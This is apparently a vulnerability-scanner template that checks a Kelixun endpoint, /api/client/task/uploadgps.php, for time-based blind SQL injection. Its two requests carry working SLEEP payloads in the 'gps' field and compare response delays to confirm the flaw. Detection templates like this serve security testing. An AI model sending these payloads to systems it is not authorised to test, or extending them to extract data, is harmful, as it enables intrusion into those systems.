name: poc-yaml-kelixun-uploadgps-sql
transport: http



rules:
  r0:
    request:
      method: POST
      path: /api/client/task/uploadgps.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: uuid=&gps=1'+AND+(SELECT+7679+FROM+(SELECT(SLEEP(3)))ozYR)+AND+'fqDZ'='fqDZ&number=
    expression: response.status == 200 && response.latency >= 3000 && response.latency <= 4000
  r1:
    request:
      method: POST
      path: /api/client/task/uploadgps.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: uuid=&gps=1'+AND+(SELECT+7679+FROM+(SELECT(SLEEP(6)))ozYR)+AND+'fqDZ'='fqDZ&number=
    expression: response.status == 200 && response.latency >= 6000 && response.latency <= 7000
expression: r0() && r1()

detail:
  author: Superhero
  links:
    - https://blog.csdn.net/m0_60571842/article/details/140069404
